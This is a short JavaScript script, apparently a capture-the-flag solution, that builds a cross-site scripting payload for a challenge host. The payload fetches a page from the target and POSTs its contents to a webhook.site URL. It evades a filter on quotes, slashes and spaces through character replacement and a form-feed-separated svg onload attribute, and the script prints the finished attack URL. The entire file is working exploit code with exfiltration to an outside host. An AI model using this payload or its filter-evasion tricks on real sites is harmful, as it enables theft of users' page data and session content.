
// no ", /, space
payload = `
fetch("info.php/a.php").then(res => res.text()).then(res => {
    fetch("https://webhook.site/354ad3a2-22e8-43ec-832d-caf0f3673b2b", {
        method: "POST",
        body: res
    });
})
`

payload = payload.replaceAll(`"`, `'`).replaceAll(`/`, `\\\\`).replaceAll(` `, ``).replaceAll(`\r`, ``).replaceAll(`\n`, ``)

// <svg\x0Conload="{payload}">
xss = `<svg\x0Conload="${payload}">`
url = `http://idek-hello.chal.idek.team:1337/?name=${encodeURIComponent(xss)}`

console.log(url)
